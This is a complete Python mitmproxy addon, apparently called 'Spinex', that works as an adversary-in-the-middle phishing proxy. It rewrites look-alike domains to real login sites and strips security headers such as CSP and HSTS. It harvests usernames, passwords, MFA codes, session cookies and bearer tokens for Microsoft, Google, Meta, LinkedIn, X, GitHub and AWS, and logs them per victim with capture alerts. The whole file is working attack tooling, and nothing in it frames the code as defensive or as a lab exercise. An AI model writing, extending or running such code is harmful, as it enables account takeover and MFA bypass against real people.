from mitmproxy import http
import json
import datetime
import os
import sys
import traceback
import re
import base64
import gzip
import zlib
import hashlib
import threading

_THIS_DIR = os.path.dirname(os.path.abspath(__file__))
if _THIS_DIR not in sys.path:
    sys.path.insert(0, _THIS_DIR)

BASE_DIR  = os.path.dirname(_THIS_DIR)
CREDS_DIR = os.path.join(BASE_DIR, "creds")
LOG_COOKIES  = os.path.join(CREDS_DIR, "aitm_cookies.json")
LOG_CREDS    = os.path.join(CREDS_DIR, "aitm_credentials.json")
LOG_HEADERS  = os.path.join(CREDS_DIR, "aitm_headers.json")
LOG_SESSIONS = os.path.join(CREDS_DIR, "aitm_sessions.json")
LOG_SKIPPED  = os.path.join(CREDS_DIR, "aitm_skipped.json")
os.makedirs(CREDS_DIR, exist_ok=True)

DEBUG_SKIPPED = False

# ---------------------------------------------------------------------------
# AUTH COOKIE REGISTRY
# ---------------------------------------------------------------------------
AUTH_COOKIE_REGISTRY = {
    "microsoft": {
        "domains": [
            "login.microsoft.com", "login.microsoftonline.com", "login.live.com",
            "account.microsoft.com", "outlook.live.com", "office.com",
        ],
        "cookies": {
            "ESTSAUTH", "ESTSAUTHPERSISTENT", "ESTSAUTHLIGHT",
            "MSISAuth", "MSISAuth1", "MSISAuthenticated",
            "MSISLoopDetectionCookie", "MSISAUTH", ".ASPXAUTH",
            "MSISSignOut", "MFA_TOTP", "MUID", "OIDCnonce", "ESTSSC",
        },
        "patterns": [r"^x-ms-"],
    },
    "google": {
        "domains": [
            "accounts.google.com", "google.com",
            "mail.google.com", "workspace.google.com",
        ],
        "cookies": {
            "SID", "HSID", "SSID", "APISID", "SAPISID",
            "NID", "SIDCC", "CONSENT",
            "__Secure-1PSID", "__Secure-3PSID",
            "__Secure-1PAPISID", "__Secure-3PAPISID",
            "__Secure-1PSIDCC", "__Secure-3PSIDCC",
            "__Host-1PLSID", "__Host-3PLSID",
        },
        "patterns": [],
    },
    "facebook": {
        "domains": ["facebook.com", "www.facebook.com", "m.facebook.com", "meta.com"],
        "cookies": {"c_user", "xs", "fr", "datr", "sb", "wd", "dpr"},
        "patterns": [],
    },
    "instagram": {
        "domains": ["instagram.com", "www.instagram.com"],
        "cookies": {"sessionid", "ds_user_id", "csrftoken", "mid", "ig_did", "ig_nrcb", "rur"},
        "patterns": [],
    },
    "linkedin": {
        "domains": ["linkedin.com", "www.linkedin.com"],
        "cookies": {"li_at", "liap", "JSESSIONID", "li_gc", "bcookie", "bscookie", "lidc"},
        "patterns": [],
    },
    "twitter": {
        "domains": ["twitter.com", "x.com", "api.twitter.com"],
        "cookies": {"auth_token", "ct0", "twid", "kdt", "remember_checked_on", "guest_id"},
        "patterns": [],
    },
    "github": {
        "domains": ["github.com", "api.github.com"],
        "cookies": {"user_session", "__Host-user_session_same_site", "dotcom_user", "logged_in", "tz", "_gh_sess"},
        "patterns": [],
    },
    "aws": {
        "domains": ["signin.aws.amazon.com", "console.aws.amazon.com"],
        "cookies": {"aws-creds", "aws-userInfo", "aws-selectedRegion", "JSESSIONID", "aws-account-alias", "noflush"},
        "patterns": [r"^aws-"],
    },
    "_generic": {
        "domains": [],
        "cookies": {
            "session", "sessionid", "session_token", "access_token", "refresh_token",
            "id_token", "auth_token", "authtoken", "token", "jwt", "PHPSESSID",
            "JSESSIONID", "ASP.NET_SessionId", "connect.sid", "remember_token",
            "remember_me", "_session_id", "user_session",
        },
        "patterns": [
            r"^jwt[_\-]", r"[_\-]token$", r"[_\-]session$", r"^auth[_\-]",
        ],
    },
}

# ---------------------------------------------------------------------------
# CREDENTIAL FIELD REGISTRY
# ---------------------------------------------------------------------------
CRED_FIELD_REGISTRY = {
    "microsoft": {
        "username": {"loginfmt", "login_hint", "username"},
        "password": {"passwd", "Password"},
        "mfa":      {"otc", "accesspass", "mfaLastError", "sacxt"},
    },
    "google": {
        "username": {"identifier", "Email", "email"},
        "password": {"Passwd", "password"},
        "mfa":      {"totpPin", "idvPin", "challengeId", "pin"},
    },
    "facebook": {
        "username": {"email", "username"},
        "password": {"pass", "password", "encpass"},
        "mfa":      {"approvals_code", "mfa_code"},
    },
    "instagram": {
        "username": {"username"},
        "password": {"password", "enc_password"},
        "mfa":      {"verification_code", "identifier"},
    },
    "linkedin": {
        "username": {"session_key", "username", "email"},
        "password": {"session_password", "password"},
        "mfa":      {"pin", "challengeId"},
    },
    "twitter": {
        "username": {"username", "email", "phone_number"},
        "password": {"password"},
        "mfa":      {"challenge_response", "totp_code"},
    },
    "github": {
        "username": {"login"},
        "password": {"password"},
        "mfa":      {"app_otp", "otp", "sms_otp"},
    },
    "aws": {
        "username": {"email", "username", "accountId"},
        "password": {"password", "passwd"},
        "mfa":      {"mfacode", "totpUserCode", "mfa_totp_token"},
    },
    "_generic": {
        "username": {
            "username", "user", "login", "email", "mail", "user_name",
            "userid", "user_id", "identifier", "account", "handle", "phone", "mobile",
        },
        "password": {
            "password", "passwd", "pass", "pwd", "secret", "credential", "pin", "passphrase",
        },
        "mfa": {
            "otp", "totp", "mfa", "2fa", "twofa", "two_fa", "code", "token",
            "verification_code", "auth_code", "authenticator_code",
            "one_time_password", "sms_code", "backup_code",
        },
    },
}

# Pre-compile all regex patterns once at import time for performance
_COMPILED_REGISTRY = {}
for _platform, _cfg in AUTH_COOKIE_REGISTRY.items():
    _COMPILED_REGISTRY[_platform] = {
        "domains":  _cfg["domains"],
        "cookies":  _cfg["cookies"],
        "patterns": [re.compile(p, re.IGNORECASE) for p in _cfg.get("patterns", [])],
    }


def _match_platform(host: str) -> list[str]:
    matched = []
    for platform, cfg in _COMPILED_REGISTRY.items():
        if platform == "_generic":
            continue
        for domain in cfg["domains"]:
            if domain in host:
                matched.append(platform)
                break
    matched.append("_generic")
    return matched


def _is_auth_cookie(name: str, platforms: list[str]) -> tuple[bool, str]:
    for platform in platforms:
        cfg = _COMPILED_REGISTRY[platform]
        if name in cfg["cookies"]:
            return True, platform
        for pattern in cfg["patterns"]:
            if pattern.search(name):
                return True, platform
    return False, ""


def convert_bytes(obj):
    if isinstance(obj, bytes):
        return obj.decode("utf-8", errors="replace")
    if isinstance(obj, dict):
        return {convert_bytes(k): convert_bytes(v) for k, v in obj.items()}
    if isinstance(obj, list):
        return [convert_bytes(i) for i in obj]
    if isinstance(obj, tuple):
        return tuple(convert_bytes(i) for i in obj)
    return obj


def _append_log(filename: str, entry: dict) -> None:
    try:
        os.makedirs(os.path.dirname(filename), exist_ok=True)
        with open(filename, "a") as f:
            f.write(json.dumps(entry) + "\n")
    except Exception:
        traceback.print_exc()


def _classify_field(field_name: str, platforms: list[str]) -> str | None:
    for platform in platforms:
        cfg = CRED_FIELD_REGISTRY.get(platform)
        if not cfg:
            continue
        name_lower = field_name.lower()
        for bucket in ("username", "password", "mfa"):
            if field_name in cfg[bucket] or name_lower in {v.lower() for v in cfg[bucket]}:
                return bucket
    return None


def _parse_post_body(flow: http.HTTPFlow) -> dict:
    if flow.request.method.upper() != "POST":
        return {}
    content_type = flow.request.headers.get("content-type", "").lower()
    raw = flow.request.content
    if not raw:
        return {}

    if "application/x-www-form-urlencoded" in content_type:
        try:
            from urllib.parse import parse_qs
            decoded = raw.decode("utf-8", errors="replace")
            parsed  = parse_qs(decoded, keep_blank_values=True)
            return {k: v[0] if len(v) == 1 else v for k, v in parsed.items()}
        except Exception:
            traceback.print_exc()
            return {}

    if "application/json" in content_type:
        try:
            decoded = raw.decode("utf-8", errors="replace")
            parsed  = json.loads(decoded)
            if isinstance(parsed, dict):
                return parsed
            if isinstance(parsed, list):
                return {item.get("key", f"item_{i}"): item.get("value", "")
                        for i, item in enumerate(parsed) if isinstance(item, dict)}
        except Exception:
            traceback.print_exc()
            return {}

    if "multipart/form-data" in content_type:
        try:
            boundary_match = re.search(r"boundary=([^\s;]+)", content_type)
            if boundary_match:
                boundary = boundary_match.group(1).encode()
                fields   = {}
                for part in raw.split(b"--" + boundary):
                    if b"Content-Disposition" not in part:
                        continue
                    header_end = part.find(b"\r\n\r\n")
                    if header_end == -1:
                        continue
                    headers_raw = part[:header_end].decode("utf-8", errors="replace")
                    body        = part[header_end + 4:].rstrip(b"\r\n--")
                    name_match  = re.search(r'name="([^"]+)"', headers_raw)
                    if name_match:
                        field_name = name_match.group(1)
                        fields[field_name] = body.decode("utf-8", errors="replace")
                return fields
        except Exception:
            traceback.print_exc()
            return {}

    return {}


# ---------------------------------------------------------------------------
# AUTH HEADER REGISTRY
# ---------------------------------------------------------------------------
AUTH_HEADER_REGISTRY = {
    "microsoft": {
        "domains": [
            "login.microsoft.com", "login.microsoftonline.com", "login.live.com",
            "graph.microsoft.com", "outlook.office365.com", "office.com",
        ],
        "headers": {"authorization", "x-ms-client-request-id"},
        "patterns": [r"^x-ms-"],
    },
    "google": {
        "domains": [
            "accounts.google.com", "oauth2.googleapis.com",
            "www.googleapis.com", "mail.google.com",
        ],
        "headers": {"authorization", "x-goog-authuser", "x-goog-api-key"},
        "patterns": [r"^x-goog-"],
    },
    "facebook": {
        "domains": ["graph.facebook.com", "api.facebook.com", "facebook.com"],
        "headers": {"authorization", "x-fb-friendly-name"},
        "patterns": [],
    },
    "instagram": {
        "domains": ["i.instagram.com", "instagram.com"],
        "headers": {"authorization", "x-ig-app-id", "x-ig-www-claim", "x-csrftoken"},
        "patterns": [r"^x-ig-"],
    },
    "twitter": {
        "domains": ["api.twitter.com", "api.x.com", "twitter.com", "x.com"],
        "headers": {"authorization", "x-twitter-auth-type", "x-csrf-token"},
        "patterns": [],
    },
    "github": {
        "domains": ["api.github.com", "github.com"],
        "headers": {"authorization", "x-github-token"},
        "patterns": [],
    },
    "aws": {
        "domains": ["signin.aws.amazon.com", "console.aws.amazon.com", "sts.amazonaws.com"],
        "headers": {"authorization", "x-amz-security-token", "x-amz-date"},
        "patterns": [r"^x-amz-"],
    },
    "linkedin": {
        "domains": ["api.linkedin.com", "linkedin.com"],
        "headers": {"authorization", "csrf-token", "x-restli-protocol-version"},
        "patterns": [],
    },
    "_generic": {
        "domains": [],
        "headers": {
            "authorization", "x-auth-token", "x-api-key", "x-access-token",
            "x-id-token", "x-refresh-token", "x-csrf-token", "api-key", "token",
        },
        "patterns": [r"^x-auth-", r"^x-api-", r"[_-]token$"],
    },
}

_COMPILED_HEADER_REGISTRY = {}
for _platform, _cfg in AUTH_HEADER_REGISTRY.items():
    _COMPILED_HEADER_REGISTRY[_platform] = {
        "domains":  _cfg["domains"],
        "headers":  _cfg["headers"],
        "patterns": [re.compile(p, re.IGNORECASE) for p in _cfg.get("patterns", [])],
    }


def _match_header_platform(host: str) -> list[str]:
    matched = []
    for platform, cfg in _COMPILED_HEADER_REGISTRY.items():
        if platform == "_generic":
            continue
        for domain in cfg["domains"]:
            if domain in host:
                matched.append(platform)
                break
    matched.append("_generic")
    return matched


def _is_auth_header(header_name: str, platforms: list[str]) -> bool:
    name_lower = header_name.lower()
    for platform in platforms:
        cfg = _COMPILED_HEADER_REGISTRY.get(platform)
        if not cfg:
            continue
        if name_lower in cfg["headers"]:
            return True
        for pattern in cfg["patterns"]:
            if pattern.search(name_lower):
                return True
    return False


def _decode_jwt(token: str) -> dict | None:
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        decoded = {}
        for i, label in enumerate(("header", "payload")):
            segment = parts[i]
            segment += "=" * (-len(segment) % 4)
            decoded[label] = json.loads(base64.urlsafe_b64decode(segment))
        return decoded
    except Exception:
        return None


def _parse_authorization_header(value: str) -> dict:
    result = {"raw": value}
    if not value:
        return result

    scheme, _, rest = value.partition(" ")
    scheme = scheme.lower()
    result["scheme"] = scheme

    if scheme == "bearer":
        result["token"] = rest.strip()
        jwt_data = _decode_jwt(rest.strip())
        if jwt_data:
            result["jwt_decoded"] = jwt_data
            payload = jwt_data.get("payload", {})
            for claim in ("sub", "email", "upn", "preferred_username",
                          "oid", "tid", "azp", "iss", "exp", "scp", "scope"):
                if claim in payload:
                    result[claim] = payload[claim]

    elif scheme == "basic":
        try:
            decoded = base64.b64decode(rest.strip()).decode("utf-8", errors="replace")
            user, _, password = decoded.partition(":")
            result["username"] = user
            result["password"] = password
        except Exception:
            result["raw_basic"] = rest

    elif scheme == "token":
        result["token"] = rest.strip()

    elif scheme == "aws4-hmac-sha256":
        cred_match = re.search(r"Credential=([^\s]+)", value)
        sig_match  = re.search(r"Signature=([^\s]+)", value)
        if cred_match:
            result["credential"] = cred_match.group(1)
        if sig_match:
            result["signature"] = sig_match.group(1)

    elif scheme == "oauth":
        for param in ("oauth_token", "oauth_consumer_key", "oauth_signature"):
            m = re.search(rf'{param}="([^"]+)"', value)
            if m:
                result[param] = m.group(1)

    return result


def _extract_auth_headers(flow: http.HTTPFlow, platforms: list[str]) -> dict:
    captured = {}
    for header_name, header_value in flow.request.headers.items():
        header_name  = convert_bytes(header_name)
        header_value = convert_bytes(header_value)

        if not _is_auth_header(header_name, platforms):
            continue

        name_lower = header_name.lower()
        if name_lower == "authorization":
            parsed = _parse_authorization_header(header_value)
            if parsed.get("scheme") in (None, "") and not parsed.get("token"):
                continue
            captured["authorization"] = parsed
        else:
            captured[header_name] = header_value

    return captured


# ---------------------------------------------------------------------------
# DOMAIN MAP  -- loaded from spinex_config.json via config_manager
# ---------------------------------------------------------------------------
try:
    import config_manager as _cm
    _spinex_cfg = _cm.load()
    DOMAIN_MAP: dict[str, str] = _cm.generate_domain_map(_spinex_cfg)
    if DOMAIN_MAP:
        print(f"[Spinex] Loaded {len(DOMAIN_MAP)} domain mappings from spinex_config.json")
    else:
        print("[Spinex] No domain mappings configured -- rewriting disabled.")
except Exception:
    print("[Spinex] Could not load config_manager -- falling back to empty DOMAIN_MAP.")
    DOMAIN_MAP: dict[str, str] = {}

_REVERSE_DOMAIN_MAP: dict[str, str] = {v: k for k, v in DOMAIN_MAP.items()}

# ---------------------------------------------------------------------------
# BASE DOMAIN DETECTION -- prevents proxy loopback to self
# ---------------------------------------------------------------------------
_BASE_DOMAINS: set[str] = set()
for _proxy_domain in DOMAIN_MAP.values():
    _parts = _proxy_domain.split(".")
    if len(_parts) >= 2:
        _base = ".".join(_parts[-2:])
        _BASE_DOMAINS.add(_base)

if _BASE_DOMAINS:
    print(f"[Spinex] Base domains (loopback protected): {_BASE_DOMAINS}")

# ---------------------------------------------------------------------------
# Security headers to strip
# ---------------------------------------------------------------------------
_STRIP_RESPONSE_HEADERS = {
    "content-security-policy",
    "content-security-policy-report-only",
    "x-frame-options",
    "x-content-type-options",
    "strict-transport-security",
    "public-key-pins",
    "public-key-pins-report-only",
    "expect-ct",
    "cross-origin-opener-policy",
    "cross-origin-embedder-policy",
    "cross-origin-resource-policy",
}

_HTML_TYPES = {"text/html", "application/xhtml+xml"}
_JS_TYPES   = {"application/javascript", "text/javascript",
               "application/x-javascript", "module"}
_CSS_TYPES  = {"text/css"}

_URL_ATTRIBUTES = re.compile(
    r"""((?:href|src|action|data-url|data-href|data-src|content|srcset|poster|
    formaction|ping|manifest|codebase)\s*=\s*['"])([^'"]+)(['"])""",
    re.IGNORECASE | re.VERBOSE,
)
_META_REFRESH = re.compile(
    r"""(content\s*=\s*['"][\d.]+\s*url\s*=\s*)([^'"]+)(['"])""",
    re.IGNORECASE,
)
_CSS_URL = re.compile(
    r"""(url\s*\(\s*['"]?)([^'")]+)(['"]?\s*\))""",
    re.IGNORECASE,
)


def _decompress_body(flow: http.HTTPFlow) -> tuple[bytes | None, bool]:
    """
    Decompress response body. Returns (body_bytes, can_rewrite).
    can_rewrite is False if the body is compressed and we could not decompress it
    (e.g. brotli not installed) -- in that case we MUST NOT touch the body.
    """
    raw = flow.response.raw_content
    if not raw:
        return None, True

    encoding = flow.response.headers.get("content-encoding", "").lower()
    if not encoding:
        return raw, True

    try:
        if "gzip" in encoding:
            body = gzip.decompress(raw)
        elif "deflate" in encoding:
            try:
                body = zlib.decompress(raw)
            except zlib.error:
                body = zlib.decompress(raw, -zlib.MAX_WBITS)
        elif "br" in encoding:
            try:
                import brotli
                body = brotli.decompress(raw)
            except ImportError:
                print("[Spinex] Brotli not installed -- skipping body rewrite for this response")
                return raw, False
        else:
            return raw, False

        del flow.response.headers["content-encoding"]
        return body, True

    except Exception as e:
        print(f"[Spinex] Decompression failed ({encoding}): {e}")
        return raw, False


def _replace_domains(text: str) -> str:
    """
    Replace all real upstream domains with their proxy counterparts.
    Uses URL-aware replacements first, then regex word-boundary for bare domains
    so we don't corrupt JavaScript variables or JSON keys.
    """
    if not DOMAIN_MAP:
        return text
    for real, proxy in DOMAIN_MAP.items():
        text = text.replace(f"https://{real}", f"https://{proxy}")
        text = text.replace(f"http://{real}",  f"http://{proxy}")
        text = text.replace(f"//{real}",        f"//{proxy}")
        escaped = re.escape(real)
        text = re.sub(rf"(?<![\w.-]){escaped}(?![\w.-])", proxy, text)
    return text


def _rewrite_json(obj):
    """Walk a JSON structure and replace domains only inside string values."""
    if isinstance(obj, str):
        return _replace_domains(obj)
    if isinstance(obj, dict):
        return {_rewrite_json(k): _rewrite_json(v) for k, v in obj.items()}
    if isinstance(obj, list):
        return [_rewrite_json(item) for item in obj]
    return obj


def _rewrite_set_cookie_domain(flow: http.HTTPFlow) -> None:
    if not DOMAIN_MAP:
        return
    new_headers = []
    for name, value in flow.response.headers.items(multi=True):
        if name.lower() == "set-cookie":
            for real, proxy in DOMAIN_MAP.items():
                value = re.sub(
                    rf"(domain\s*=\s*)\.?{re.escape(real)}",
                    rf"\g<1>.{proxy}",
                    value,
                    flags=re.IGNORECASE,
                )
        new_headers.append((name, value))
    flow.response.headers.clear()
    for name, value in new_headers:
        flow.response.headers.add(name, value)


def _rewrite_location_header(flow: http.HTTPFlow) -> None:
    location = flow.response.headers.get("location", "")
    if location:
        new_location = _replace_domains(location)
        if new_location != location:
            flow.response.headers["location"] = new_location


def _rewrite_html(body: str) -> str:
    if not DOMAIN_MAP:
        return body

    def replace_attr(m: re.Match) -> str:
        return m.group(1) + _replace_domains(m.group(2)) + m.group(3)

    def replace_meta(m: re.Match) -> str:
        return m.group(1) + _replace_domains(m.group(2)) + m.group(3)

    body = _URL_ATTRIBUTES.sub(replace_attr, body)
    body = _META_REFRESH.sub(replace_meta, body)

    def replace_script(m: re.Match) -> str:
        return m.group(1) + _rewrite_js(m.group(2)) + m.group(3)

    body = re.sub(
        r"(<script[^>]*>)(.*?)(</script>)",
        replace_script,
        body,
        flags=re.DOTALL | re.IGNORECASE,
    )

    def replace_style(m: re.Match) -> str:
        return m.group(1) + _rewrite_css(m.group(2)) + m.group(3)

    body = re.sub(
        r"(<style[^>]*>)(.*?)(</style>)",
        replace_style,
        body,
        flags=re.DOTALL | re.IGNORECASE,
    )

    body = _replace_domains(body)
    return body


def _rewrite_js(js: str) -> str:
    if not DOMAIN_MAP:
        return js
    return _replace_domains(js)


def _rewrite_css(css: str) -> str:
    if not DOMAIN_MAP:
        return css
    def replace_css_url(m: re.Match) -> str:
        return m.group(1) + _replace_domains(m.group(2)) + m.group(3)
    return _CSS_URL.sub(replace_css_url, css)


def _rewrite_response(flow: http.HTTPFlow) -> None:
    """
    Full response rewrite pipeline.
    If body decompression fails, we skip body rewriting entirely so we don't
    serve garbled binary to the victim.
    """
    if not DOMAIN_MAP:
        return

    for header in list(flow.response.headers.keys()):
        if header.lower() in _STRIP_RESPONSE_HEADERS:
            del flow.response.headers[header]

    _rewrite_set_cookie_domain(flow)
    _rewrite_location_header(flow)

    content_type = flow.response.headers.get("content-type", "").lower()
    ct_base = content_type.split(";")[0].strip()

    needs_rewrite = (
        ct_base in _HTML_TYPES or
        ct_base in _JS_TYPES   or
        ct_base in _CSS_TYPES  or
        "json" in ct_base
    )
    if not needs_rewrite:
        return

    body_bytes, can_rewrite = _decompress_body(flow)
    if not body_bytes or not can_rewrite:
        return

    charset = "utf-8"
    charset_match = re.search(r"charset\s*=\s*([\w-]+)", content_type)
    if charset_match:
        charset = charset_match.group(1)

    try:
        body_str = body_bytes.decode(charset, errors="replace")
    except (LookupError, UnicodeDecodeError):
        body_str = body_bytes.decode("utf-8", errors="replace")

    if ct_base in _HTML_TYPES:
        body_str = _rewrite_html(body_str)
    elif ct_base in _JS_TYPES:
        body_str = _rewrite_js(body_str)
    elif ct_base in _CSS_TYPES:
        body_str = _rewrite_css(body_str)
    elif "json" in ct_base:
        try:
            parsed = json.loads(body_str)
            rewritten = _rewrite_json(parsed)
            body_str = json.dumps(rewritten, ensure_ascii=False)
        except Exception:
            body_str = _replace_domains(body_str)
    else:
        body_str = _replace_domains(body_str)

    flow.response.content = body_str.encode("utf-8", errors="replace")
    flow.response.headers["content-length"] = str(len(flow.response.content))


# ---------------------------------------------------------------------------
# SESSION STORE
# ---------------------------------------------------------------------------

def _get_victim_ip(flow: http.HTTPFlow) -> str:
    xff = flow.request.headers.get("x-forwarded-for", "")
    if xff:
        return xff.split(",")[0].strip()
    if flow.client_conn and flow.client_conn.peername:
        return flow.client_conn.peername[0]
    return "unknown"


def _make_session_id(ip: str, user_agent: str) -> str:
    fingerprint = f"{ip}::{user_agent}".encode("utf-8", errors="replace")
    return hashlib.sha256(fingerprint).hexdigest()[:16]


class SessionStore:
    def __init__(self) -> None:
        self._store: dict[str, dict] = {}
        self._lock  = threading.Lock()

    def _now(self) -> str:
        return str(datetime.datetime.now())

    def _get_or_create(self, flow: http.HTTPFlow) -> dict:
        ip         = _get_victim_ip(flow)
        user_agent = flow.request.headers.get("user-agent", "unknown")
        sid        = _make_session_id(ip, user_agent)

        if sid not in self._store:
            self._store[sid] = {
                "id":           sid,
                "status":       "new",
                "ip":           ip,
                "user_agent":   user_agent,
                "platform":     "unknown",
                "first_seen":   self._now(),
                "last_seen":    self._now(),
                "credentials":  [],
                "cookies":      [],
                "auth_headers": [],
            }
        else:
            self._store[sid]["last_seen"] = self._now()

        return self._store[sid]

    def _advance_status(self, session: dict) -> None:
        has_creds   = bool(session["credentials"])
        has_cookies = bool(session["cookies"])
        has_headers = bool(session["auth_headers"])

        if has_creds and has_cookies:
            session["status"] = "captured"
        elif has_creds or has_headers:
            session["status"] = "active"
        else:
            session["status"] = "new"

    def _flush(self, session: dict) -> None:
        try:
            existing: dict[str, dict] = {}
            if os.path.exists(LOG_SESSIONS):
                with open(LOG_SESSIONS, "r") as f:
                    for line in f:
                        line = line.strip()
                        if line:
                            try:
                                rec = json.loads(line)
                                existing[rec["id"]] = rec
                            except Exception:
                                pass

            existing[session["id"]] = session

            with open(LOG_SESSIONS, "w") as f:
                for rec in existing.values():
                    f.write(json.dumps(rec) + "\n")

        except Exception:
            traceback.print_exc()

    def update_credentials(self, flow, url, platform, captured):
        with self._lock:
            session = self._get_or_create(flow)
            if session["platform"] == "unknown" and platform != "unknown":
                session["platform"] = platform

            session["credentials"].append({
                "timestamp": self._now(),
                "url":       url,
                "username":  captured.get("username", {}),
                "password":  captured.get("password", {}),
                "mfa":       captured.get("mfa", {}),
            })
            self._advance_status(session)
            self._flush(session)

    def update_cookies(self, flow, url, platform, auth_cookies):
        with self._lock:
            session = self._get_or_create(flow)
            if session["platform"] == "unknown" and platform != "unknown":
                session["platform"] = platform

            session["cookies"].append({
                "timestamp": self._now(),
                "url":       url,
                "cookies":   auth_cookies,
            })
            self._advance_status(session)
            if session["status"] == "captured":
                _print_capture_alert(session)
            self._flush(session)

    def update_auth_headers(self, flow, url, platform, auth_headers):
        with self._lock:
            session = self._get_or_create(flow)
            if session["platform"] == "unknown" and platform != "unknown":
                session["platform"] = platform

            session["auth_headers"].append({
                "timestamp": self._now(),
                "method":    flow.request.method,
                "url":       url,
                "headers":   auth_headers,
            })
            self._advance_status(session)
            self._flush(session)

    def get_all(self) -> list[dict]:
        with self._lock:
            return list(self._store.values())


def _print_capture_alert(session: dict) -> None:
    sep = "=" * 60
    creds = session["credentials"][-1] if session["credentials"] else {}
    username_fields = creds.get("username", {})
    identity = next(iter(username_fields.values()), "unknown")

    print(f"\n{sep}")
    print(f"  *** SESSION CAPTURED ***")
    print(f"  Session ID : {session['id']}")
    print(f"  Platform   : {session['platform']}")
    print(f"  Victim IP  : {session['ip']}")
    print(f"  Identity   : {identity}")
    print(f"  First seen : {session['first_seen']}")
    print(f"  Captured   : {session['last_seen']}")
    print(f"  Saved to   : {LOG_SESSIONS}")
    print(f"{sep}\n")

SESSION_STORE = SessionStore()


class AitmLogger:
    def load(self, loader):
        print("[Spinex] AitmLogger addon loaded successfully")

    def request(self, flow: http.HTTPFlow) -> None:
        try:
            host = flow.request.pretty_host
            url  = flow.request.url

            # =====================================================================
            # FIX 1: Prevent proxy loopback to base domain
            # If the victim requests the bare base domain (e.g. registration-portal.online)
            # and it's NOT a mapped subdomain, mitmproxy would connect back to itself
            # because DNS points to the same VPS IP. We block this with a 404.
            # =====================================================================
            if host in _BASE_DOMAINS and host not in _REVERSE_DOMAIN_MAP:
                flow.response = http.Response.make(
                    404,
                    b"Not Found",
                    {"content-type": "text/plain"}
                )
                print(f"[Spinex] Blocked loopback request to base domain: {host}")
                return

            # =====================================================================
            # FIX 2: Rewrite proxy domain -> real upstream domain
            # Must happen BEFORE any logging so the connection goes to the
            # correct upstream server.
            # =====================================================================
            original_host = host
            if host in _REVERSE_DOMAIN_MAP:
                real_host = _REVERSE_DOMAIN_MAP[host]
                print(f"[Spinex] Rewriting upstream: {host} -> {real_host}")
                flow.request.host = real_host
                flow.request.headers["Host"] = real_host

                # HTTP/2 :authority pseudo-header must also be updated
                if ":authority" in flow.request.headers:
                    flow.request.headers[":authority"] = real_host

                # Keep original host in a custom header for debugging
                flow.request.headers["X-Spinex-Original-Host"] = original_host

            # Use the REAL host for platform matching (so Instagram cookies
            # match the Instagram registry even though the victim sees the proxy)
            upstream_host = flow.request.host

            platforms   = _match_platform(upstream_host)
            h_platforms = _match_header_platform(upstream_host)

            # Step 3: Auth headers
            auth_headers = _extract_auth_headers(flow, h_platforms)
            if auth_headers:
                platform = h_platforms[0] if h_platforms else "unknown"
                header_entry = {
                    "timestamp": str(datetime.datetime.now()),
                    "method":    flow.request.method,
                    "host":      upstream_host,
                    "proxy_host": original_host if original_host != upstream_host else upstream_host,
                    "url":       url,
                    "platform":  platform,
                    "headers":   auth_headers,
                }
                _append_log(LOG_HEADERS, header_entry)
                SESSION_STORE.update_auth_headers(flow, url, platform, auth_headers)

            # Step 2: POST credential capture
            if flow.request.method.upper() != "POST":
                return

            fields = _parse_post_body(flow)
            if not fields:
                return

            captured = {"username": {}, "password": {}, "mfa": {}}
            for field_name, field_value in fields.items():
                field_name  = convert_bytes(field_name)  if isinstance(field_name,  bytes) else str(field_name)
                field_value = convert_bytes(field_value) if isinstance(field_value, bytes) else str(field_value)
                bucket = _classify_field(field_name, platforms)
                if bucket:
                    captured[bucket][field_name] = field_value

            has_creds = any(captured[b] for b in ("username", "password", "mfa"))
            if not has_creds:
                return

            platform = platforms[0] if platforms else "unknown"
            entry = {
                "timestamp": str(datetime.datetime.now()),
                "host":      upstream_host,
                "proxy_host": original_host if original_host != upstream_host else upstream_host,
                "url":       url,
                "platform":  platform,
                "creds":     {
                    "username": captured["username"],
                    "password": captured["password"],
                    "mfa":      captured["mfa"],
                },
            }
            _append_log(LOG_CREDS, entry)
            SESSION_STORE.update_credentials(flow, url, platform, captured)

        except Exception:
            traceback.print_exc()

    def response(self, flow: http.HTTPFlow) -> None:
        try:
            # Use the upstream host (already rewritten in request hook)
            host   = flow.request.host
            url    = flow.request.url
            status = flow.response.status_code

            print(f"[Spinex] Response from {host} | Status: {status} | URL: {url}")

            platforms = _match_platform(host)
            raw_cookies = flow.response.cookies

            # ==================== COOKIE CAPTURE ====================
            if raw_cookies:
                auth_cookies = {}
                skipped_cookies = {}

                for name, cookie_obj in raw_cookies.items():
                    if hasattr(cookie_obj, "value"):
                        value = cookie_obj.value
                    elif isinstance(cookie_obj, tuple) and len(cookie_obj) > 0:
                        value = cookie_obj[0]
                    else:
                        value = str(cookie_obj)

                    name = convert_bytes(name)
                    value = convert_bytes(value)

                    is_auth, matched_platform = _is_auth_cookie(name, platforms)

                    if is_auth:
                        auth_cookies[name] = {"value": value, "platform": matched_platform}
                    elif DEBUG_SKIPPED:
                        skipped_cookies[name] = value

                if auth_cookies:
                    platform = platforms[0] if platforms else "unknown"
                    _append_log(LOG_COOKIES, {
                        "timestamp": str(datetime.datetime.now()),
                        "host": host,
                        "url": url,
                        "cookies": auth_cookies,
                    })
                    SESSION_STORE.update_cookies(flow, url, platform, auth_cookies)

                if DEBUG_SKIPPED and skipped_cookies:
                    _append_log(LOG_SKIPPED, {
                        "timestamp": str(datetime.datetime.now()),
                        "host": host,
                        "url": url,
                        "skipped": skipped_cookies,
                    })

            # ==================== RESPONSE REWRITE ====================
            _rewrite_response(flow)

            print(f"[Spinex] Successfully processed response from {host}")

        except Exception as e:
            print(f"[Spinex] Response processing error: {e}")
            traceback.print_exc()


addons = [AitmLogger()]
